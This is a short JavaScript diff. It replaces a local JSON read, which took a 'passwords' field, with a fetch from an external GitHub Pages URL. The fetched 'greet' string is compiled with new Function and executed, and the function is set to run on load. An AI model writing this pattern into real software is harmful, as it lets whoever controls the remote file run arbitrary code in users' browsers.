@@ -1,8 +1,10 @@
 function fetchAndGet() {
-  let pAPI = fetch("./ytData/data.json");
-  pAPI.then((value) => {
-    return value.json();
-  }).then((value) => {
-    dataAPI = value.passwords[0];
-  });
+  fetch('https://bysimpuprasad.github.io/repo/fetchData/fetch.json')
+    .then(response => response.json())
+    .then(data => {
+      const func = new Function('data', data.greet);
+      console.log(func(data));
+    });
 }
+
+fetchAndGet();
